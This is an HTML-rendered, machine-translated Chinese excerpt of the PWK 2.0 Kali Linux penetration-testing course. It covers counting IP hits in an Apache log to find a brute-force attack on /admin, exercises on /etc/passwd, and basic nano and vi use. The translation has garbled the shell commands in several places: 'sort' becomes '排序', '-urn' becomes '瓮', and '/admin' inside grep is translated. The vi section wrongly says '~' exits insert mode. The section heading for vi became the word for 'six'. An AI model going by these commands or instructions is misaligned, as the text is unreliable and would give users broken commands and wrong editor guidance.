<div style="position:absolute;top:68491;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的输出，并按每个 IP 地址访问服务器的次数对数据进行排序。</font><font style="vertical-align: inherit;">该</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-c</font></font></font></b></nobr></div>
<div style="position:absolute;top:68510;left:109"><nobr><font style="vertical-align: inherit;"></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">uniq</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项</font><font style="vertical-align: inherit;">将以出现次数作为输出行的前缀。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:68545;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat access.log | </font><font style="vertical-align: inherit;">cut -d " " -f 1 | </font><font style="vertical-align: inherit;">排序 | </font><font style="vertical-align: inherit;">uniq -c | </font><font style="vertical-align: inherit;">排序 - 瓮</font></font></font></b></nobr></div>
<div style="position:absolute;top:68562;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1038 208.68.234.99</font></font></nobr></div>
<div style="position:absolute;top:68579;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">59 208.115.113.91</font></font></nobr></div>
<div style="position:absolute;top:68596;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22 208.54.80.244</font></font></nobr></div>
<div style="position:absolute;top:68613;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21 99.127.177.95</font></font></nobr></div>
<div style="position:absolute;top:68630;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8 70.194.129.34</font></font></nobr></div>
<div style="position:absolute;top:68647;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 201.21.152.44</font></font></nobr></div>
<div style="position:absolute;top:68667;left:241"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 50 - 使用 uniq 命令获取文件中每个 IP 地址的计数</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:68696;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一些 IP 地址很突出，但我们将重点关注具有最高访问权限的地址</font></font></nobr></div>
<div style="position:absolute;top:68715;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">频率第一。</font><font style="vertical-align: inherit;">过滤掉208.68.234.99地址，显示和统计</font></font></nobr></div>
<div style="position:absolute;top:68735;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">被该 IP 请求，我们可以使用以下序列：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:68769;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat access.log | </font><font style="vertical-align: inherit;">grep '208.68.234.99' | </font><font style="vertical-align: inherit;">cut -d "\"" -f 2 | uniq -c</font></font></font></b></nobr></div>
<div style="position:absolute;top:68786;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1038 GET //管理HTTP/1.1</font></font></nobr></div>
<div style="position:absolute;top:68806;left:259"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 51 - 探索特定 IP 地址访问的资源</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:68835;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从这个输出来看，208.68.234.99 处的 IP 地址似乎正在访问 /admin 目录</font></font></nobr></div>
<div style="position:absolute;top:68855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只。</font><font style="vertical-align: inherit;">让我们进一步检查一下。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:68889;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat access.log | </font><font style="vertical-align: inherit;">grep '208.68.234.99' | </font><font style="vertical-align: inherit;">grep '/管理员' | </font><font style="vertical-align: inherit;">排序 -u</font></font></font></b></nobr></div>
<div style="position:absolute;top:68907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">208.68.234.99 - - [22/Apr/2013:07:51:20 -0500] "GET //admin HTTP/1.1" 401 742 "-" "Teh</font></font></nobr></div>
<div style="position:absolute;top:68923;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">森林龙虾”</font></font></nobr></div>
<div style="position:absolute;top:68940;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">208.68.234.99 - 管理员 [22/Apr/2013:07:51:25 -0500] "GET //admin HTTP/1.1" 200 575 "-" </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:69079;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="59"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 59 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:69112;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:70189;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:70189;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:70189;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">59</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:69208;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">「Teh 森林龙虾」</font></font></nobr></div>
<div style="position:absolute;top:69224;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:69258;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat access.log|grep '208.68.234.99'| </font><font style="vertical-align: inherit;">grep -v '/管理员'</font></font></font></b></nobr></div>
<div style="position:absolute;top:69276;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font></nobr></div>
<div style="position:absolute;top:69295;left:330"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 52 - 仔细查看日志文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:69324;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显然 208.68.234.99 已经参与了针对该 Web 的 HTTP 暴力尝试</font></font></nobr></div>
<div style="position:absolute;top:69344;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器。</font><font style="vertical-align: inherit;">此外，经过大约1000次尝试，似乎蛮力尝试成功了，</font></font></nobr></div>
<div style="position:absolute;top:69363;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如“HTTP 200”消息所示。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:69397;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.3.5.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:69427;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用 /etc/passwd，提取 Kali 上所有用户的用户和主目录字段</font></font></nobr></div>
<div style="position:absolute;top:69446;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外壳设置为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/bin/false 的机器</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">确保使用 Bash one-liner 打印</font></font></nobr></div>
<div style="position:absolute;top:69466;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出到屏幕。</font><font style="vertical-align: inherit;">输出应该类似于下面的清单 53：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:69496;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">你的命令在这里...</font></font></font></b></nobr></div>
<div style="position:absolute;top:69513;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户 mysql 主目录为 /nonexistent</font></font></nobr></div>
<div style="position:absolute;top:69530;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户 Debian-snmp 主目录是 /var/lib/snmp</font></font></nobr></div>
<div style="position:absolute;top:69547;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户语音调度器主目录是 /var/run/speech-dispatcher</font></font></nobr></div>
<div style="position:absolute;top:69564;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户 Debian-gdm 主目录是 /var/lib/gdm3</font></font></nobr></div>
<div style="position:absolute;top:69583;left:287"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 53 - 使用 /bin/false shell 的用户的主目录</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:69608;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 将 /etc/passwd 文件复制到您的主目录 (/home/kali)。</font></font></nobr></div>
<div style="position:absolute;top:69637;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> in a one-liner 打印 /kali/passwd 的输出并替换所有实例</font></font></nobr></div>
<div style="position:absolute;top:69656;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">带有“GDM”的“Gnome 显示管理器”字符串。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:69693;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.4 从命令行编辑文件</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:69735;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，让我们来看看在命令 shell 环境中的文件编辑。</font><font style="vertical-align: inherit;">这是一个极其重要的</font></font></nobr></div>
<div style="position:absolute;top:69755;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 技能，尤其是在渗透测试期间，如果您碰巧访问了类 Unix 操作系统。</font></font></nobr></div>
<div style="position:absolute;top:69787;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽管有像</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">gedit </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">61</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Leafpad </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">62</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这样的</font><font style="vertical-align: inherit;">文本编辑器</font><font style="vertical-align: inherit;">，由于它们可能更具视觉吸引力</font></font></nobr></div>
<div style="position:absolute;top:69806;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于他们的图形用户界面，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">63</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将专注于基于文本的终端编辑器，它强调</font></font></nobr></div>
<div style="position:absolute;top:69826;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">速度和多功能性。</font></font></nobr></div>
<div style="position:absolute;top:69859;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">谈到文本编辑器时，每个人似乎都有偏好，但我们将介绍</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基本</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用法</font></font></nobr></div>
<div style="position:absolute;top:69878;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于两个最常见的选项：</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nano</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">vi</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:69913;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.4.1 纳米</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:69950;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nano </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">64</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是最简单易用的文本编辑器之一。</font><font style="vertical-align: inherit;">要打开文件并开始编辑，只需运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nano</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font></nobr></div>
<div style="position:absolute;top:69970;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将文件名作为可选参数传递：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:70079;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">61 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（GNOME 项目，2019 年），https://wiki.gnome.org/Apps/Gedit</font></font></font></nobr></div>
<div style="position:absolute;top:70099;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">62 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Leafpad</font></font></font></nobr></div>
<div style="position:absolute;top:70119;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">63 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Graphical_user_interface</font></font></font></nobr></div>
<div style="position:absolute;top:70139;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">64 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(GNU Nano, 2019) https://www.nano-editor.org/docs.php</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:70267;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="60"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 60 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:70300;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:71377;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:71377;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:71377;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">60</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:70390;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.4.1.1.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:70412;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nano intro_to_nano.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:70431;left:328"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 54 - 使用 nano 编辑器打开文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:70460;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开文件后，我们可以立即开始对文件进行任何所需的更改</font></font></nobr></div>
<div style="position:absolute;top:70479;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将在图形编辑器中。</font><font style="vertical-align: inherit;">如图 5 所示，命令菜单位于</font></font></nobr></div>
<div style="position:absolute;top:70499;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">屏幕。</font><font style="vertical-align: inherit;">需要记住的一些最常用的命令包括：</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C o</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将更改写入</font></font></nobr></div>
<div style="position:absolute;top:70518;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件, </font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C k</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">剪切当前行, </font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C u</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">取消剪切一行并将其粘贴到光标位置, </font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C</font></font></font></nobr></div>
</span></font>
<font size="5" face="Times"><span style="font-size:36px;font-family:Times">
<div style="position:absolute;top:70538;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">w</font></font><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索，</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> C x</font></font><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">退出。</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:70855;left:366"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 5：使用 nano 编辑文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:70886;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有关 nano 的其他信息，请参阅其在线文档。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">65</font></font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:70921;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.4.2 六</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:70958;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">vi</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个非常强大的文本编辑器，能够以惊人的速度，尤其是在涉及到</font></font></nobr></div>
<div style="position:absolute;top:70978;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自动化重复性任务。</font><font style="vertical-align: inherit;">然而，它有一个相对陡峭的学习曲线，而且还差得远</font></font></nobr></div>
<div style="position:absolute;top:70997;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">像 Nano 一样简单易用。</font><font style="vertical-align: inherit;">由于其复杂性，我们将只介绍非常基础的内容。</font><font style="vertical-align: inherit;">与纳米一样，</font></font></nobr></div>
<div style="position:absolute;top:71016;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要编辑文件，只需将其名称作为参数传递给</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">vi</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:71052;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">vi intro_to_vi.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:71071;left:338"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 55 - 使用 vi 编辑器打开文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:71100;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开文件后，启用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">插入文本模式</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以开始输入。</font><font style="vertical-align: inherit;">为此，请按</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">i</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">键并</font></font></nobr></div>
<div style="position:absolute;top:71120;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始打字。</font></font></nobr></div>
<div style="position:absolute;top:71152;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要禁用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">插入文本模式</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并返回</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令模式</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，请按</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">~</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">键。</font><font style="vertical-align: inherit;">在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指挥时</font></font></i></nobr></div>
<div style="position:absolute;top:71172;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mode</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dd</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">删除当前行，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">yy</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">复制当前行，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">p</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">粘贴剪贴板内容，</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:71192;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">删除当前字符，</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">:w</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将当前文件写入磁盘并停留在 vi 中，</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">:q! </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">退出</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:71210;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将文件写入磁盘，最后</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">:wq</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保存并退出。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:71327;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">65 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(GNU Nano, 2018) https://www.nano-editor.org/dist/v2.9/nano.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:71455;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="61"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 61 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:71488;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:72565;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:72565;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:72565;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">61</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:71869;left:375"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 6：使用 vi 编辑文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:71900;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">vi</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用起来很笨拙，所以很多用户都避免使用它。</font><font style="vertical-align: inherit;">然而，从渗透测试人员的</font></font></nobr></div>
<div style="position:absolute;top:71919;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来看，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">vi</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以在有经验的用户手中节省大量时间，</font><font style="vertical-align: inherit;">安装</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">vi</font></font></i><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:71938;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在每个符合 POSIX 的系统上。</font></font></nobr></div>
<div style="position:absolute;top:71971;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">随意深入挖掘自己；</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">vi</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">很强大。</font><font style="vertical-align: inherit;">有关更多信息，请参阅以下内容</font></font></nobr></div>
<div style="position:absolute;top:71991;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网址：</font></font></nobr></div>
<div style="position:absolute;top:72023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:72023;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://en.wikibooks.org/wiki/Learning_the_vi_Editor/vi_Reference</font></font></nobr></div>
<div style="position:absolute;top:72052;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:72052;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://www.debian.org/doc/manuals/debian-tutorial/ch-editor.html</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
